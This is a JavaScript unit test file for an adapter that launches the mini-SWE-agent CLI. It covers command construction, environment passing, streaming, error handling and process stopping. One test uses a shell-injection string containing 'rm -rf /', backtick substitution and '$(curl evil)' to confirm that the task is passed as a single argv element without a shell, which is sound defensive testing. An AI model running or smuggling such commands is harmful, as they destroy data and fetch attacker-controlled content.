'use strict';

/**
 * Unit tests for the mini-SWE-agent adapter (Node / agent-connector runtime).
 *
 * No real `mini` binary, workspace or model is needed: `child_process.spawn` is
 * faked to emit plain stdout lines and an exit code, and the network helpers
 * (sendThinking/sendStatus/sendResponse/sendError) are stubbed on the instance.
 *
 * Covered: registration under 'mini-swe-agent', readiness/preflight, command
 * construction (--yolo --exit-immediately --task, stable order, verbatim task
 * argv, no shell string), the task-prompt wrapper, cwd + env passing
 * (PYTHONUNBUFFERED/NO_COLOR/PATH/keys), streaming, exit-code handling, error
 * classification, stop control + process-group kill, and no cross-run leakage.
 */

const { describe, it, after, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const EventEmitter = require('node:events');
const os = require('node:os');
const path = require('node:path');
const fs = require('node:fs');
const cp = require('node:child_process');

// Install a swappable spawn shim BEFORE requiring the adapter, so the
// module-level `const { spawn } = require('child_process')` binds to it.
const realSpawn = cp.spawn;
let spawnImpl = null;
let lastSpawn = null;
cp.spawn = (...args) => (spawnImpl ? spawnImpl(...args) : realSpawn(...args));

const { createAdapter, ADAPTER_MAP, MiniSweAgentAdapter } = require('../src/adapters');

after(() => { cp.spawn = realSpawn; });

function makeFakeSpawn(stdoutLines, exitCode = 0, stderr = '') {
  return (cmd, args, opts) => {
    const proc = new EventEmitter();
    proc.pid = 4242;
    proc.exitCode = null;
    proc.stdout = new EventEmitter();
    proc.stderr = new EventEmitter();
    proc.kill = () => {};
    lastSpawn = { cmd, args, opts };
    setImmediate(() => {
      for (const line of stdoutLines) proc.stdout.emit('data', Buffer.from(line, 'utf-8'));
      if (stderr) proc.stderr.emit('data', Buffer.from(stderr, 'utf-8'));
      proc.exitCode = exitCode;
      proc.emit('exit', exitCode);
    });
    return proc;
  };
}

function makeAdapter(extra = {}) {
  const adapter = createAdapter('mini-swe-agent', {
    workspaceId: 'ws',
    channelName: 'general',
    token: 'tok',
    agentName: 'mini-bot',
    endpoint: 'https://example.invalid',
    agentType: 'mini-swe-agent',
    agentEnv: extra.agentEnv || {},
    workingDir: extra.workingDir || '/tmp/proj',
  });
  adapter._miniBin = '/usr/bin/mini';
  // Keep per-run trajectory files out of the real ~/.openagents.
  adapter._sessionsDir = path.join(os.tmpdir(), `mini-test-${process.pid}-${Math.floor(process.hrtime()[1])}`);
  // Stub network + status helpers — record what was streamed / sent.
  adapter._reportStatus = () => {};
  adapter._autoTitleChannel = async () => {};
  adapter._streamed = { thinking: [], status: [], response: [], error: [] };
  adapter.sendThinking = async (_c, content) => adapter._streamed.thinking.push(content);
  adapter.sendStatus = async (_c, content) => adapter._streamed.status.push(content);
  adapter.sendResponse = async (_c, content) => adapter._streamed.response.push(content);
  adapter.sendError = async (_c, content) => adapter._streamed.error.push(content);
  return adapter;
}

describe('mini-SWE-agent adapter — registration', () => {
  it('is registered under the "mini-swe-agent" agent type', () => {
    assert.equal('mini-swe-agent' in ADAPTER_MAP, true);
    assert.equal(typeof MiniSweAgentAdapter, 'function');
  });

  it('createAdapter("mini-swe-agent") returns a MiniSweAgentAdapter', () => {
    const a = makeAdapter();
    assert.equal(a.constructor.name, 'MiniSweAgentAdapter');
    assert.equal(typeof a._handleMessage, 'function');
  });

  it('does not disturb the existing adapter map', () => {
    for (const t of ['claude', 'aider', 'amp', 'goose', 'cline', 'copilot']) {
      assert.equal(t in ADAPTER_MAP, true, `${t} should still be registered`);
    }
  });
});

describe('mini-SWE-agent adapter — registry metadata / readiness semantics', () => {
  const registry = JSON.parse(
    fs.readFileSync(path.join(__dirname, '..', 'registry.json'), 'utf-8'),
  );
  const entry = registry.find((e) => e.name === 'mini-swe-agent');

  it('is present in the bundled registry with the right label + install', () => {
    assert.ok(entry, 'mini-swe-agent should be in registry.json');
    assert.equal(entry.label, 'mini-SWE-agent');
    assert.equal(entry.install.binary, 'mini');
    assert.match(entry.install.linux, /pip install mini-swe-agent/);
  });

  it('treats a configured model alone as a readiness signal (no fixed API key required)', () => {
    // Readiness must NOT hinge on one specific API key: MSWEA_MODEL_NAME being
    // present is enough (mini can also be configured via a config file).
    assert.ok(entry.check_ready.env_vars.includes('MSWEA_MODEL_NAME'));
    assert.ok(entry.check_ready.env_vars.includes('ANTHROPIC_API_KEY'));
    assert.ok(entry.check_ready.env_vars.includes('OPENAI_API_KEY'));
  });

  it('uses MSWEA_MINI_CONFIG_PATH (the real env var) as a FULL-config field that counts as configured', () => {
    const f = entry.env_config.find((x) => x.name === 'MSWEA_MINI_CONFIG_PATH');
    assert.ok(f, 'MSWEA_MINI_CONFIG_PATH env field must exist');
    assert.ok(
      !entry.env_config.some((x) => x.name === 'MSWEA_CONFIG_PATH'),
      'the invented MSWEA_CONFIG_PATH field must be gone',
    );
    assert.match(f.description, /REPLACES/i, 'must document that it replaces (not merges) the default config');
    assert.ok(
      entry.check_ready.env_vars.includes('MSWEA_MINI_CONFIG_PATH'),
      'a full config file must count as configured',
    );
  });

  it('exposes DEEPSEEK_API_KEY and a per-provider base URL for each of the three providers', () => {
    const names = entry.env_config.map((x) => x.name);
    assert.ok(names.includes('DEEPSEEK_API_KEY'), 'DEEPSEEK_API_KEY field must exist');
    // Per-provider base URLs (litellm reads a different var per provider).
    for (const baseUrl of ['OPENAI_BASE_URL', 'ANTHROPIC_BASE_URL', 'DEEPSEEK_API_BASE']) {
      assert.ok(names.includes(baseUrl), `${baseUrl} field must exist`);
      // A base URL is only an endpoint — never a readiness signal on its own.
      assert.ok(!entry.check_ready.env_vars.includes(baseUrl), `${baseUrl} must NOT be a readiness signal`);
    }
    // A DeepSeek key DOES count as configured.
    assert.ok(entry.check_ready.env_vars.includes('DEEPSEEK_API_KEY'));
    const deepseek = entry.env_config.find((x) => x.name === 'DEEPSEEK_API_KEY');
    assert.equal(deepseek.password, true, 'DEEPSEEK_API_KEY must be a masked field');
  });

  it('uses a non-blocking "configure a model" hint — never claims the CLI is missing', () => {
    const msg = entry.check_ready.not_ready_message.toLowerCase();
    assert.ok(!msg.includes('not installed'), 'must not say "not installed"');
    assert.ok(!msg.includes('not found'), 'must not say "not found"');
    assert.match(entry.check_ready.not_ready_message, /Configure a model/);
  });
});

describe('mini-SWE-agent adapter — preflight / binary resolution', () => {
  it('preflight is OK when the CLI resolves', () => {
    const a = makeAdapter();
    a._miniBin = '/usr/bin/mini';
    assert.deepEqual(a.preflight(), { ok: true });
  });

  it('preflight reports runtime_missing (not not_installed) when the CLI cannot be resolved', () => {
    const a = makeAdapter();
    a._miniBin = null;
    a._findMiniBinary = () => null;
    const r = a.preflight();
    assert.equal(r.ok, false);
    assert.equal(r.reason, 'runtime_missing');
    assert.match(r.message, /pip install mini-swe-agent/);
  });
});

describe('mini-SWE-agent adapter — command construction', () => {
  it('builds the bare headless command with no model/config', () => {
    const a = makeAdapter();
    assert.deepEqual(
      a._buildMiniArgs({ task: 'do it' }),
      ['--yolo', '--exit-immediately', '--task', 'do it'],
    );
  });

  it('adds --model before --yolo when a model is set', () => {
    const a = makeAdapter();
    assert.deepEqual(
      a._buildMiniArgs({ model: 'anthropic/claude', task: 'do it' }),
      ['--model', 'anthropic/claude', '--yolo', '--exit-immediately', '--task', 'do it'],
    );
  });

  it('never passes --config (config flows via the MSWEA_MINI_CONFIG_PATH env var)', () => {
    const a = makeAdapter();
    assert.ok(!a._buildMiniArgs({ task: 'do it' }).includes('--config'));
    assert.ok(!a._buildMiniArgs({ model: 'm', task: 'do it' }).includes('--config'));
  });

  it('keeps a stable order: model, --yolo, --exit-immediately, --task', () => {
    const a = makeAdapter();
    assert.deepEqual(
      a._buildMiniArgs({ model: 'm', task: 't' }),
      ['--model', 'm', '--yolo', '--exit-immediately', '--task', 't'],
    );
  });

  it('always includes --exit-immediately (so the process exits instead of prompting)', () => {
    const a = makeAdapter();
    for (const opts of [{ task: 't' }, { model: 'm', task: 't' }, { configPath: '/c', task: 't' }]) {
      assert.ok(a._buildMiniArgs(opts).includes('--exit-immediately'));
    }
  });

  it('adds --cost-limit only when a valid numeric limit is set', () => {
    const a = makeAdapter();
    assert.deepEqual(
      a._buildMiniArgs({ costLimit: '3.5', task: 't' }),
      ['--yolo', '--exit-immediately', '--cost-limit', '3.5', '--task', 't'],
    );
  });

  it('adds --output before --task when a trajectory path is set', () => {
    const a = makeAdapter();
    const args = a._buildMiniArgs({ trajectoryPath: '/tmp/traj.json', task: 't' });
    assert.deepEqual(
      args,
      ['--yolo', '--exit-immediately', '--output', '/tmp/traj.json', '--task', 't'],
    );
  });

  it('passes the task verbatim as the last argv element (quotes/newlines/shell metachars)', () => {
    const a = makeAdapter();
    const nasty = 'fix "the bug"; rm -rf / && echo `whoami`\n$(curl evil) — line2';
    const args = a._buildMiniArgs({ model: 'm', task: nasty });
    assert.equal(args[args.length - 2], '--task');
    assert.equal(args[args.length - 1], nasty, 'task must be a single, unmodified argv element');
  });

  it('resolves model from MSWEA_MODEL_NAME and cost limit from MSWEA_COST_LIMIT', () => {
    const a = makeAdapter({ agentEnv: { MSWEA_MODEL_NAME: 'gpt-4o', MSWEA_COST_LIMIT: '2' } });
    assert.equal(a._model(), 'gpt-4o');
    assert.equal(a._costLimit(), '2');
    assert.equal(typeof a._configPath, 'undefined', 'the invented _configPath() helper must be gone');
  });

  it('ignores a non-numeric cost limit', () => {
    const a = makeAdapter({ agentEnv: { MSWEA_COST_LIMIT: 'abc' } });
    assert.equal(a._costLimit(), null);
  });
});

describe('mini-SWE-agent adapter — task prompt wrapper', () => {
  it('wraps the user message without SWE-bench / patch / benchmark wording', async () => {
    spawnImpl = makeFakeSpawn(['done\n']);
    const a = makeAdapter();
    await a._runMini('Please refactor the parser', 'general');
    const taskIdx = lastSpawn.args.indexOf('--task');
    const task = lastSpawn.args[taskIdx + 1];
    assert.match(task, /current workspace directory/);
    assert.match(task, /Please refactor the parser/);
    for (const banned of ['swe-bench', 'swebench', 'patch', 'benchmark', 'predictions']) {
      assert.ok(!task.toLowerCase().includes(banned), `task prompt must not mention "${banned}"`);
    }
  });
});

describe('mini-SWE-agent adapter — spawn cwd / env / shell', () => {
  beforeEach(() => { lastSpawn = null; });

  it('runs in the workspace directory (not the daemon cwd)', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    const a = makeAdapter({ workingDir: '/tmp/myproject' });
    await a._runMini('hi', 'general');
    assert.equal(lastSpawn.opts.cwd, '/tmp/myproject');
    assert.notEqual(lastSpawn.opts.cwd, process.cwd());
  });

  it('forwards agent env keys and sets PYTHONUNBUFFERED / NO_COLOR, does not strip PATH', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    // The daemon hands the adapter a full env (incl. PATH) as agentEnv; assert
    // the adapter forwards it and prepends the enhanced bin dirs rather than
    // dropping the inherited PATH.
    const a = makeAdapter({ agentEnv: { ANTHROPIC_API_KEY: 'sk-ant-secret', MSWEA_MODEL_NAME: 'anthropic/claude', PATH: '/usr/bin:/bin' } });
    await a._runMini('hi', 'general');
    assert.equal(lastSpawn.opts.env.ANTHROPIC_API_KEY, 'sk-ant-secret');
    assert.equal(lastSpawn.opts.env.MSWEA_MODEL_NAME, 'anthropic/claude');
    assert.equal(lastSpawn.opts.env.PYTHONUNBUFFERED, '1');
    assert.equal(lastSpawn.opts.env.NO_COLOR, '1');
    assert.ok(lastSpawn.opts.env.PATH.includes('/usr/bin'), 'inherited PATH must be preserved');
  });

  it('never uses a shell string (argv array + shell:false on POSIX)', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    const a = makeAdapter();
    await a._runMini('hi', 'general');
    assert.equal(lastSpawn.opts.shell, false);
    assert.equal(lastSpawn.cmd, '/usr/bin/mini');
    assert.ok(Array.isArray(lastSpawn.args));
  });

  it('sets MSWEA_CONFIGURED=true to skip mini’s interactive first-run wizard', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    const a = makeAdapter();
    await a._runMini('hi', 'general');
    assert.equal(lastSpawn.opts.env.MSWEA_CONFIGURED, 'true');
  });

  it('does not override an explicit MSWEA_CONFIGURED from the agent env', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    const a = makeAdapter({ agentEnv: { MSWEA_CONFIGURED: 'false' } });
    await a._runMini('hi', 'general');
    assert.equal(lastSpawn.opts.env.MSWEA_CONFIGURED, 'false');
  });

  it('forwards MSWEA_MINI_CONFIG_PATH via the env, never as a --config flag', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    const a = makeAdapter({ agentEnv: { MSWEA_MINI_CONFIG_PATH: '/home/u/mini.yaml' } });
    await a._runMini('hi', 'general');
    assert.equal(lastSpawn.opts.env.MSWEA_MINI_CONFIG_PATH, '/home/u/mini.yaml');
    assert.ok(!lastSpawn.args.includes('--config'), 'config must flow via env, not --config');
  });

  it('never logs a forwarded secret', async () => {
    spawnImpl = makeFakeSpawn(['ok\n']);
    const a = makeAdapter({ agentEnv: { ANTHROPIC_API_KEY: 'sk-ant-supersecret' } });
    const logs = [];
    a._log = (m) => logs.push(m);
    await a._runMini('hi', 'general');
    assert.ok(!logs.join('\n').includes('sk-ant-supersecret'));
  });
});

describe('mini-SWE-agent adapter — lifecycle', () => {
  beforeEach(() => { lastSpawn = null; });

  it('streams stdout as thinking and returns the transcript on exit 0', async () => {
    spawnImpl = makeFakeSpawn(['step 1: reading files\n', 'step 2: editing\n', 'Done. Summary: fixed it.\n']);
    const a = makeAdapter();
    const { text, error } = await a._spawnMini(['/usr/bin/mini', '--yolo', '--exit-immediately', '--task', 't'], 'general');
    assert.equal(error, null);
    assert.match(text, /Done\. Summary: fixed it\./);
    assert.ok(a._streamed.thinking.includes('step 1: reading files'));
    assert.equal('general' in a._channelProcesses, false, 'process handle must be cleaned up');
  });

  it('marks a non-zero exit as failed with a diagnostic, no transcript', async () => {
    spawnImpl = makeFakeSpawn(['starting\n'], 2, 'boom: something broke');
    const a = makeAdapter();
    const { text, error } = await a._spawnMini(['/usr/bin/mini', '--yolo', '--exit-immediately', '--task', 't'], 'general');
    assert.equal(text, '');
    assert.match(error, /exited with code 2/);
  });

  it('classifies an authentication failure into an actionable message', async () => {
    spawnImpl = makeFakeSpawn([], 1, 'litellm.AuthenticationError: invalid api key');
    const a = makeAdapter();
    const { error } = await a._spawnMini(['/usr/bin/mini', '--yolo', '--exit-immediately', '--task', 't'], 'general');
    assert.match(error, /Authentication failed/);
  });

  it('classifies a cost-limit stop into an actionable message', async () => {
    spawnImpl = makeFakeSpawn([], 1, 'Cost limit reached before finishing');
    const a = makeAdapter();
    const { error } = await a._spawnMini(['/usr/bin/mini', '--yolo', '--exit-immediately', '--task', 't'], 'general');
    assert.match(error, /cost limit/i);
  });

  it('_handleMessage sends exactly one final response on success', async () => {
    spawnImpl = makeFakeSpawn(['working\n', 'All done.\n']);
    const a = makeAdapter();
    await a._handleMessage({ content: 'do the thing', sessionId: 'general', senderName: 'user' });
    assert.equal(a._streamed.response.length, 1, 'exactly one final response');
    assert.equal(a._streamed.error.length, 0, 'no error on success');
    assert.match(a._streamed.response[0], /All done\./);
  });

  it('_handleMessage sends exactly one error on non-zero exit', async () => {
    spawnImpl = makeFakeSpawn([], 1, 'notfounderror: unknown model foo');
    const a = makeAdapter();
    await a._handleMessage({ content: 'do the thing', sessionId: 'general', senderName: 'user' });
    assert.equal(a._streamed.error.length, 1, 'exactly one error');
    assert.equal(a._streamed.response.length, 0, 'no success response on failure');
    assert.match(a._streamed.error[0], /Model not found/);
  });

  it('reports a missing CLI as an actionable error (never silently)', async () => {
    const a = makeAdapter();
    a._miniBin = null;
    a._findMiniBinary = () => null;
    await a._handleMessage({ content: 'x', sessionId: 'general', senderName: 'user' });
    assert.equal(a._streamed.error.length, 1);
    assert.match(a._streamed.error[0], /pip install mini-swe-agent/);
  });

  it('does not reuse a stale cwd / process handle across runs', async () => {
    const a = makeAdapter({ workingDir: '/tmp/first' });
    spawnImpl = makeFakeSpawn(['one\n']);
    await a._runMini('a', 'general');
    assert.equal(lastSpawn.opts.cwd, '/tmp/first');
    assert.equal('general' in a._channelProcesses, false);

    a.workingDir = '/tmp/second';
    spawnImpl = makeFakeSpawn(['two\n']);
    await a._runMini('b', 'general');
    assert.equal(lastSpawn.opts.cwd, '/tmp/second');
    assert.equal('general' in a._channelProcesses, false);
  });
});

describe('mini-SWE-agent adapter — trajectory retention', () => {
  beforeEach(() => { lastSpawn = null; });

  // Fake spawn that writes a trajectory file at the --output path (simulating
  // what real mini does), so retention behaviour can be asserted against the FS.
  function makeTrajWritingSpawn(exitCode, stderr = '') {
    return (cmd, args, opts) => {
      const proc = new EventEmitter();
      proc.pid = 4242;
      proc.exitCode = null;
      proc.stdout = new EventEmitter();
      proc.stderr = new EventEmitter();
      proc.kill = () => {};
      lastSpawn = { cmd, args, opts };
      const outIdx = args.indexOf('--output');
      const outPath = outIdx >= 0 ? args[outIdx + 1] : null;
      setImmediate(() => {
        if (outPath) {
          try {
            fs.mkdirSync(path.dirname(outPath), { recursive: true });
            fs.writeFileSync(outPath, '{"trajectory":true}');
          } catch {}
        }
        if (stderr) proc.stderr.emit('data', Buffer.from(stderr, 'utf-8'));
        proc.exitCode = exitCode;
        proc.emit('exit', exitCode);
      });
      return proc;
    };
  }

  it('removes the trajectory on a clean success', async () => {
    spawnImpl = makeTrajWritingSpawn(0);
    const a = makeAdapter();
    await a._runMini('hi', 'general');
    const outPath = lastSpawn.args[lastSpawn.args.indexOf('--output') + 1];
    assert.equal(fs.existsSync(outPath), false, 'trajectory should be cleaned on success');
  });

  it('keeps the trajectory and logs its path on failure', async () => {
    spawnImpl = makeTrajWritingSpawn(1, 'boom: it broke');
    const a = makeAdapter();
    const logs = [];
    a._log = (m) => logs.push(m);
    await a._runMini('hi', 'general');
    const outPath = lastSpawn.args[lastSpawn.args.indexOf('--output') + 1];
    try {
      assert.equal(fs.existsSync(outPath), true, 'trajectory should be kept on failure');
      assert.ok(
        logs.some((l) => l.includes('trajectory kept') && l.includes(outPath)),
        'the kept trajectory path should be logged',
      );
    } finally {
      try { fs.rmSync(outPath, { force: true }); } catch {}
    }
  });
});

describe('mini-SWE-agent adapter — Windows binary preference', () => {
  it('prefers mini.exe over a mini.cmd shim when both exist (Windows)', () => {
    const a = makeAdapter();
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mini-bin-'));
    try {
      fs.writeFileSync(path.join(dir, 'mini.exe'), '');
      fs.writeFileSync(path.join(dir, 'mini.cmd'), '');
      assert.equal(
        a._resolveExePreference(path.join(dir, 'mini.cmd'), true),
        path.join(dir, 'mini.exe'),
      );
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('keeps the .cmd shim when no sibling .exe exists (Windows)', () => {
    const a = makeAdapter();
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mini-bin-'));
    try {
      const cmd = path.join(dir, 'mini.cmd');
      fs.writeFileSync(cmd, '');
      assert.equal(a._resolveExePreference(cmd, true), cmd);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('is a no-op off Windows (keeps whatever the resolver returned)', () => {
    const a = makeAdapter();
    assert.equal(a._resolveExePreference('/usr/bin/mini', false), '/usr/bin/mini');
  });
});

describe('mini-SWE-agent adapter — stop / cancellation', () => {
  it('terminates the running process and marks the channel stopped', async () => {
    const a = makeAdapter();
    const stopped = [];
    a._stopProcess = async () => stopped.push('killed');
    const statuses = [];
    a.sendStatus = async (_c, content) => statuses.push(content);

    const proc = new EventEmitter();
    proc.pid = 99;
    proc.exitCode = null;
    a._channelProcesses.general = proc;

    await a._onControlAction('stop', {});

    assert.equal(stopped.length, 1);
    assert.equal('general' in a._channelProcesses, false);
    assert.equal(a._stoppingChannels.has('general'), true);
    assert.deepEqual(statuses, ['Execution stopped by user']);
  });

  it('_stopProcess signals the process (group) with SIGTERM', async () => {
    const a = makeAdapter();
    const signals = [];
    const proc = new EventEmitter();
    // A pid unlikely to map to a real process group, so process.kill(-pid)
    // throws ESRCH and we fall back to proc.kill(...).
    proc.pid = 2147483646;
    proc.exitCode = null;
    proc.kill = (sig) => { signals.push(sig); if (sig === 'SIGTERM') setImmediate(() => proc.emit('exit', 0)); };
    await a._stopProcess(proc);
    assert.ok(signals.includes('SIGTERM'), 'should send SIGTERM');
  });
});
